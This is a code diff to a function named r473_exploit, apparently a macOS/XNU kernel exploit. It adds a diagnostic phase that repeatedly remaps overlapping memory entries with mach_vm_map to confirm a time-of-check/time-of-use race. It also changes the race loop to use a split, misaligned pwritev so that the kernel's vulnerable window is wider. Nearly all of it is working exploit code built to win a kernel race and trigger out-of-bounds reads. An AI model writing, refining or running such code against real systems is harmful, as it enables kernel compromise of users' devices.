@@ -17772,6 +17772,66 @@ static void r473_exploit(void) {
     rlog("    %llu search pages mapped and faulted\n",
          (unsigned long long)search_pages);
 
+    /* Phase 3.5: Mapping diagnostic */
+    rlog("\n  --- Phase 3.5: Mapping diagnostic ---\n");
+    fflush(stdout);
+    {
+        mach_vm_address_t taddr = search_base;
+        /* Test 1: map large surface (should work) */
+        mach_vm_address_t t1 = taddr;
+        kern_return_t kr1 = mach_vm_map(mach_task_self(), &t1, R473_LARGE_SZ, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            large_entry, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+        uint8_t v1 = *(volatile uint8_t *)taddr;
+        rlog("    large map kr=0x%x val=0x%02x (expect 0xAA)\n", kr1, v1);
+
+        /* Test 2: map small surface at 16K (overwrite first page) */
+        mach_vm_address_t t2 = taddr;
+        kern_return_t kr2 = mach_vm_map(mach_task_self(), &t2, R473_SMALL_SZ, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            small_entry, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+        uint8_t v2a = *(volatile uint8_t *)taddr;
+        uint8_t v2b = *(volatile uint8_t *)(taddr + R473_SMALL_SZ);
+        rlog("    small map kr=0x%x first=0x%02x (expect 0xBB) second=0x%02x (expect 0xAA)\n",
+             kr2, v2a, v2b);
+
+        /* Test 3: restore large surface */
+        mach_vm_address_t t3 = taddr;
+        kern_return_t kr3 = mach_vm_map(mach_task_self(), &t3, R473_LARGE_SZ, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            large_entry, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+        uint8_t v3 = *(volatile uint8_t *)taddr;
+        rlog("    restore kr=0x%x val=0x%02x (expect 0xAA)\n", kr3, v3);
+
+        /* Test 4: quick race test (500 oscillations, check data) */
+        int saw_bb = 0, saw_aa = 0;
+        for (int q = 0; q < 500; q++) {
+            mach_vm_address_t ta = taddr;
+            mach_vm_map(mach_task_self(), &ta, R473_SMALL_SZ, 0,
+                VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                small_entry, 0, FALSE,
+                VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+                VM_INHERIT_NONE);
+            ta = taddr;
+            mach_vm_map(mach_task_self(), &ta, R473_LARGE_SZ, 0,
+                VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                large_entry, 0, FALSE,
+                VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+                VM_INHERIT_NONE);
+            uint8_t vq = *(volatile uint8_t *)taddr;
+            if (vq == 0xBB) saw_bb++;
+            else if (vq == 0xAA) saw_aa++;
+        }
+        rlog("    quick osc: aa=%d bb=%d (both nonzero = race visible)\n", saw_aa, saw_bb);
+        fflush(stdout);
+    }
+
     /* Phase 4: TOCTOU race — oscillate large↔small */
     rlog("\n  --- Phase 4: Asymmetric TOCTOU race ---\n");
     fflush(stdout);
@@ -17788,7 +17848,7 @@ static void r473_exploit(void) {
 
     int total_races = 0, race_wins = 0, oob_reads = 0;
     int einval_count = 0, short_writes = 0;
-    int small_wins = 0; /* first 16K = 0xBB → small surface was read */
+    int small_wins = 0;
 
     shared.go = 1;
     __sync_synchronize();
@@ -17810,8 +17870,13 @@ static void r473_exploit(void) {
             VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
             VM_INHERIT_NONE);
 
-        struct iovec iov = { (void *)addr, R473_WRITE_SZ };
-        ssize_t w = pwritev(fd, &iov, 1, 0);
+        /* Use misaligned multi-iov write to widen kernel code path window */
+        struct iovec iovs[2];
+        iovs[0].iov_base = (void *)addr;
+        iovs[0].iov_len = R473_WRITE_SZ / 2;
+        iovs[1].iov_base = (void *)(addr + R473_WRITE_SZ / 2);
+        iovs[1].iov_len = R473_WRITE_SZ / 2;
+        ssize_t w = pwritev(fd, iovs, 2, 0);
         int save_errno = errno;
         total_races++;
 
